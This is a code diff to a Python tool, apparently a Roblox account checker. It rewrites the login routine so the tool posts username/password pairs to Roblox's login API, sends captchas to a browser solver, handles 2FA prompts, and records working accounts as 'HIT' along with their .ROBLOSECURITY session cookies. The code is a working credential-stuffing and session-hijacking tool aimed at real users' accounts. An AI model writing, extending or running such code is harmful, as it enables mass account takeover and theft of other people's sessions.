@@ -133,124 +133,152 @@ class Roblox:
                 self.counter.increment()
 
     def _perform_login(self):
-        # Setup headers first
-        self.session.headers.update({
-            "Origin": "https://www.roblox.com",
-            "Referer": "https://www.roblox.com/login",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Content-Type": "application/json",
-        })
-
-        # Get auth intent (may be empty for some accounts)
-        print(f"[LOGIN] Getting auth intent for {self.account[0]}...")
-        self.sai = AuthIntent.get_auth_intent(self.session)
-        if self.sai:
-            print(f"[LOGIN] ✅ Auth intent ready")
-        else:
-            print(f"[LOGIN] ⚠️ No auth intent - continuing anyway")
-
-        # First, try to detect if username or email
-        test = self.session.post("https://auth.roblox.com/v2/login", json={
-            "ctype": "Username", "cvalue": self.account[0], "password": self.account[1]
-        })
+        """API-First Login - Simple and accurate like reference checker."""
+        username, password = self.account[0], self.account[1]
         
-        # Determine ctype
-        if test.status_code == 200:
-            self.ctype = "Username"
-        elif "@" in self.account[0]:
-            self.ctype = "Email"
-        else:
-            self.ctype = "Username"
-
-        # Build payload with auth intent
+        # Get CSRF token first
+        if not self.session.csrf_token:
+            self.session.get_csrf_token()
+        
+        # Store credentials for browser solver (if needed later)
+        self.session.username = username
+        self.session.password = password
+        
+        # Simple API login (like reference code)
         payload = {
-            "ctype": self.ctype, 
-            "cvalue": self.account[0], 
-            "password": self.account[1],
+            "ctype": "Username",
+            "cvalue": username,
+            "password": password
         }
         
-        # Add secureAuthenticationIntent if available
-        if self.sai:
-            payload["secureAuthenticationIntent"] = self.sai
-
-        resp = self.session.post("https://auth.roblox.com/v2/login", json=payload)
-        csrf = resp.headers.get("x-csrf-token")
-        if csrf:
-            self.session.headers["x-csrf-token"] = csrf
-            resp = self.session.post("https://auth.roblox.com/v2/login", json=payload)
-
-        data = resp.json()
-
-        if resp.status_code == 200:
-            cookie = self.session.cookies.get(".ROBLOSECURITY")
-            uid = data.get("user", {}).get("id")
+        try:
+            resp = self.session.post("https://auth.roblox.com/v1/login", json=payload, timeout=30)
+            data = resp.json() if resp.text else {}
+        except Exception as e:
+            print(f"[LOGIN] ❌ Request error for {username}: {e}")
+            self._invalid()
+            return
+        
+        # Check for errors (like reference code)
+        if "errors" in data:
+            for error in data["errors"]:
+                code = error.get("code", -1)
+                message = error.get("message", "")
+                
+                # Code 1 = Incorrect password
+                if code == 1:
+                    print(f"[LOGIN] ❌ Invalid: {username}")
+                    self._invalid()
+                    return
+                
+                # Code 2 = Captcha required - SWITCH TO BROWSER
+                elif code == 2:
+                    print(f"[LOGIN] 🧩 Captcha for {username} - opening browser...")
+                    self._solve_captcha_browser()
+                    return
+                
+                # Code 0 = Challenge or multi-factor
+                elif code == 0:
+                    if "Challenge" in message or "challenge" in message.lower():
+                        print(f"[LOGIN] 🧩 Captcha challenge for {username} - opening browser...")
+                        self._solve_captcha_browser()
+                        return
+                    elif "users" in error.get("fieldData", ""):
+                        self.handle_multi(error)
+                        return
+                    else:
+                        print(f"[LOGIN] ❌ Error 0 for {username}: {message}")
+                        self._invalid()
+                        return
+                
+                # 2FA required
+                elif code in [17, 23, 24]:
+                    self._handle_2fa_challenge(data, payload)
+                    return
+                
+                # Other error
+                else:
+                    print(f"[LOGIN] ❌ Error {code} for {username}: {message}")
+                    self._invalid()
+                    return
+            
+            self._invalid()
+            return
+        
+        # Success - logged in!
+        if "user" in data:
+            user_data = data["user"]
+            cookie = self.session.cookies.get(".ROBLOSECURITY", "")
+            uid = user_data.get("id")
+            
             if cookie and uid:
+                print(f"[LOGIN] ✅ HIT: {username}")
                 self.handle_valid({"userId": uid, "cookie": cookie})
             return
-
-        # Handle captcha challenge
+        
+        # Check for challenge ID (captcha)
         if "challengeId" in data:
-            metadata = data.get("challengeMetadata", "{}")
-            token = get_token(self.session, metadata)
-            if token:
-                self._continue_challenge(data["challengeId"], token)
+            print(f"[LOGIN] 🧩 Challenge for {username} - opening browser...")
+            self._solve_captcha_browser()
             return
-
-        # Handle 2FA challenge
-        if "twoStepVerification" in data or self._is_2fa_challenge(data):
+        
+        # 2FA
+        if "twoStepVerification" in data:
             self._handle_2fa_challenge(data, payload)
             return
-
-        # Handle error response
-        # Check if error is in top-level ({"code": 0, "message": "..."})
-        # or in errors array ({"errors": [{"code": 1, ...}]})
-        if "errors" in data:
-            err = data["errors"][0] if data["errors"] else {}
-            code = err.get("code", -1)
-            msg = err.get("message", "")
-        else:
-            code = data.get("code", -1)
-            msg = data.get("message", "")
-            err = data
         
-        # Rate limit
-        if resp.status_code == 429:
-            print(f"[LOGIN] ⚠️ Rate limited for {self.account[0]}")
-            return
+        # Unknown response
+        print(f"[LOGIN] ❓ Unknown response for {username}")
+        self._invalid()
+    
+    def _solve_captcha_browser(self):
+        """Solve captcha by opening browser - only called when captcha detected."""
+        username, password = self.account[0], self.account[1]
         
-        # Handle specific error codes
-        if code == 0:
-            # Code 0 can mean different things
-            if "Challenge" in msg or "challenge" in msg:
-                # Captcha required - start solver
-                print(f"[LOGIN] 🧩 Captcha required for {self.account[0]}")
-                token = get_token(self.session, "")
-                if token:
-                    # Retry login with captcha token
-                    payload["captchaToken"] = token
-                    resp = self.session.post("https://auth.roblox.com/v2/login", json=payload)
-                    data = resp.json()
-                    if resp.status_code == 200:
-                        cookie = self.session.cookies.get(".ROBLOSECURITY")
-                        uid = data.get("user", {}).get("id")
-                        if cookie and uid:
-                            self.handle_valid({"userId": uid, "cookie": cookie})
+        # Get captcha token from browser solver
+        token = get_token(self.session, "")
+        
+        if token and token != "SKIP":
+            # Retry login with captcha token
+            payload = {
+                "ctype": "Username",
+                "cvalue": username,
+                "password": password,
+                "captchaToken": token
+            }
+            
+            try:
+                resp = self.session.post("https://auth.roblox.com/v1/login", json=payload, timeout=30)
+                data = resp.json() if resp.text else {}
+                
+                if "user" in data:
+                    user_data = data["user"]
+                    cookie = self.session.cookies.get(".ROBLOSECURITY", "")
+                    uid = user_data.get("id")
+                    
+                    if cookie and uid:
+                        print(f"[LOGIN] ✅ HIT after captcha: {username}")
+                        self.handle_valid({"userId": uid, "cookie": cookie})
                         return
+                
+                # Check for errors after captcha
+                if "errors" in data:
+                    for error in data["errors"]:
+                        code = error.get("code", -1)
+                        if code == 1:
+                            self._invalid()
+                            return
+                        elif code in [17, 23, 24]:
+                            self._handle_2fa_challenge(data, payload)
+                            return
+                
                 self._invalid()
-            elif "users" in err.get("fieldData", ""):
-                self.handle_multi(err)
-            else:
-                # Generic code 0 error
-                print(f"[LOGIN] ❌ Error for {self.account[0]}: {msg}")
+            except Exception as e:
+                print(f"[LOGIN] ❌ Error after captcha: {e}")
                 self._invalid()
-        elif code == 1:
+        else:
+            print(f"[LOGIN] ❌ Captcha failed for {username}")
             self._invalid()
-        elif code == 4:
-            self._locked()
-        elif code in (6, 7):
-            self._banned(code == 6)
 
     def _is_2fa_challenge(self, data: dict) -> bool:
         """Check if this is a 2FA challenge."""
